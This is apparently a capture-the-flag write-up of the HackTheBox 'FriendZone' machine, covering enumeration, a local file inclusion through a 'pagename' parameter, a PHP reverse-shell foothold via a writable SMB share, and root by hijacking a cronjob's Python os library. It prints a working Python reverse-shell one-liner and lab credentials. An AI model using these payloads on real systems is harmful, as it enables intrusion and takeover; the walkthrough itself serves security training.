---
title: "HackTheBox - FriendZone"
author: Nasrallah
description: ""
date: 2023-05-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, cronjob, smb, lfi]
img_path: /assets/img/hackthebox/machines/friendzone
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [FriendZone](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.123                                                                                                                             
Host is up (0.23s latency).                                                                                                                                   
Not shown: 993 closed tcp ports (reset)                                                                                                                       
PORT    STATE SERVICE     VERSION                                                                                                                             
21/tcp  open  ftp         vsftpd 3.0.3                                                                                                                        
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                                                                 
| ssh-hostkey:                                                                                                                                                
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)                                                                                                               
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)                                                                                                              
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)                                                                                                            
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)                                                                                           
| dns-nsid:                                                                                                                                                   
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu                                                                                                                    
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))                                                                                                      
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                  
|_http-title: Friend Zone Escape software                                                                                                                     
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                         
443/tcp open  ssl/http    Apache httpd 2.4.29                                                                                                                 
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO                                            
| Not valid before: 2018-10-05T21:02:30                                                                                                                       
|_Not valid after:  2018-11-04T21:02:30                                                                                                                       
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-05-14T08:52:05+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-14T05:52:06
|_  start_date: N/A
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
```

There are 7 ports open:

- 21/tcp vsftp 3.0.3
- 22/tcp OpenSSH
- 53/tcp DNS
- 80/tcp Apache http web server
- 139-445/tcp SMB
- 443 SSL/TLS

From the ssl certificate we find the domain `friendzone.red`, so let's add it to `/etc/hosts`.

### DNS

DNS on tcp is rare since it's usually found running on a udp ports.

Let's use `dig` and search for subdomains.

```terminal
$ dig axfr @10.10.10.123 friendzone.red

; <<>> DiG 9.16.37-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 286 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Sun May 14 14:04:49 +01 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

We found three subdomains, let's add them to /etc/hosts

### SMB

First let's run the smb-enum-shares script from nmap

```terminal
$ sudo nmap --script smb-enum-shares -p 445 10.10.10.123
Nmap scan report for admin.friendzoneportal.red (10.10.10.123)                                                                                                
Host is up (0.22s latency).                                                                                                                                   
                                                                                                                                                              
PORT    STATE SERVICE                                                                                                                                         
445/tcp open  microsoft-ds                                                                                                                                    
                                                                                                                                                              
Host script results:                                                                                                                                          
| smb-enum-shares:                                                                                                                                            
|   account_used: guest                                                                                                                                       
|   \\10.10.10.123\Development:                                                                                                                               
|     Type: STYPE_DISKTREE                                                                                                                                    
|     Comment: FriendZone Samba Server Files                                                                                                                  
|     Users: 0                                                                                                                                                
|     Max Users: <unlimited>                                                                                                                                  
|     Path: C:\etc\Development                                                                                                                                
|     Anonymous access: READ/WRITE                                                                                                                            
|     Current user access: READ/WRITE                                                                                                                         
|   \\10.10.10.123\Files:                                                                                                                                     
|     Type: STYPE_DISKTREE                                                                                                                                    
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

We found 5 shares, and the script shows us the location of every share, the Development share for example is located at `/etc/Development`

Let's use `smbmap` to  see what permission do we have over the shares

```terminal
$ smbmap -H 10.10.10.123                                           
[+] Guest session       IP: 10.10.10.123:445    Name: admin.friendzoneportal.red                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

The share `general` is read only and `Development` is writable.

Let's connect to `general`

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/friendzone]
└──╼ $ smbclient //10.10.10.123/general -N    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 21:10:51 2019
  ..                                  D        0  Tue Sep 13 15:56:24 2022
  creds.txt                           N       57  Wed Oct 10 00:52:42 2018

                3545824 blocks of size 1024. 1501344 blocks available
smb: \> get creds.txt 
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/friendzone]
└──╼ $ cat creds.txt    
creds for the admin THING:

admin:WORKWORKHhallelujah@#

                                                                                   
```

We found a creds.txt file that contains admin credentials.

Let's check `Development`

```terminal
$ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 14 14:39:26 2023
  ..                                  D        0  Tue Sep 13 15:56:24 2022

                3545824 blocks of size 1024. 1501344 blocks available
smb: \> 
```

The share is empty

### Web

Let's navigate to the web page at `friendzone.red`

![](1.png)

Nothing useful except for a possible new domain name `frienzoneporta.red`.

Let's check https now

![](2.png)

We found a new page this time, and checking the source code we find a `/js` directory

Let's scan for file and directories

```terminal
$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u https://friendzone.red -o scans/fero1.txt -k[21/582]
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ https://friendzone.red                                                                                                           
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt                                                 
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 💾  Output File           │ scans/fero1.txt                                                                                                                  
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🔓  Insecure              │ true                                                                                                                             
 🔃  Recursion Depth       │ 4                                                                                                                                
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                                                                                                            
200      GET       14l       30w      238c https://friendzone.red/
301      GET        9l       28w      318c https://friendzone.red/admin => https://friendzone.red/admin/
301      GET        9l       28w      315c https://friendzone.red/js => https://friendzone.red/js/
[####################] - 3m    244887/244887  0s      found:3       errors:3       
[####################] - 3m     81629/81629   352/s   https://friendzone.red/ 
[####################] - 0s     81629/81629   0/s     https://friendzone.red/admin/ => Directory listing (add -e to scan)
[####################] - 0s     81629/81629   0/s     https://friendzone.red/js/ => Directory listing (add -e to scan)
```

We found `/admin` and `/js`, lets visit them both.

![](3.png)

`Admin` is empty and on `js` we found the following:

![](4.png)

Found a long string but doesn't know what it's for.

Now let's go to `administrator1.friendzone.red`

![](5.png)

We found a login page, let's use the creds we found earlier.

![](6.png)

We've logged in successfully and we're told to go to `dashboard.php`, on this page we're informed that image parameter is mission and we're given two parameters we can submit, so let's add them to the url `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`

![](7.png)

We got back an image and the text `Final Access timestamp is 1684085889`.

Let's run another file scan but this time we add `php` extension

```terminal
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u https://administrator1.friendzone.red/ -o scans/fero1.txt -k -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://administrator1.friendzone.red/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ scans/fero1.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      122l      307w     2873c https://administrator1.friendzone.red/
301      GET        9l       28w      349c https://administrator1.friendzone.red/images => https://administrator1.friendzone.red/images/
403      GET       11l       32w      309c https://administrator1.friendzone.red/.php
200      GET        1l        2w        7c https://administrator1.friendzone.red/login.php
200      GET        1l       12w      101c https://administrator1.friendzone.red/dashboard.php
200      GET        1l        5w       36c https://administrator1.friendzone.red/timestamp.php

```

We found `timestamp.php`, let's navigate to it.

![](8.png)

It's the same thing we got in the dashboard, and the parameter `pagename` is used to include the file and add `.php` at the end.

Let's see what's really happening by requesting the base64 of `dashboard.php` with `pagename=php://filter/convert.base64-encode/resource=dashboard`

![](9.png)

We got it, now let's decode it on `CYberChef`

![](10.png)

As we expected, the `pagename` uses include function to request files and add `.php` extension at the end.

## **Foothold**

Remember the `Development` shares right? It's writeable and located at `/etc/Development`. What if we uploaded a php reverse shell to the share and use the `pagename` parameter to request the file and get a reverse shell? Let's see if this works.

![](11.png)

It worked and we got a shell.


## **Privilege Escalation**

### friend

Checking the web files we find a config file with some credentials.

![](12.png)

Let's use the password and ssh as `friend`.

![](13.png)

### root

Checking directories on the system i came across a python script in `/opt`.

![](14.png)

I assumed the script is running as a cronjob so i uploaded `pspy64` to see if that's the case.

![](15.png)

We are right, but how to exploit that? We can't edit the file and only have read permission over the directory.

One thing the script is doing is importing the `os` library so let's check that.

![](16.png)

The `os.py` file is writeable, so we can add a script to it to get a shell.

One problem we have is that most reverse shells uses the `os` library to get a shell, i searched for one that doesn't and found it:

```python
import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
```

Let's add the code above to os.py and setup a listener to receive the reverse shell.

![](17.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).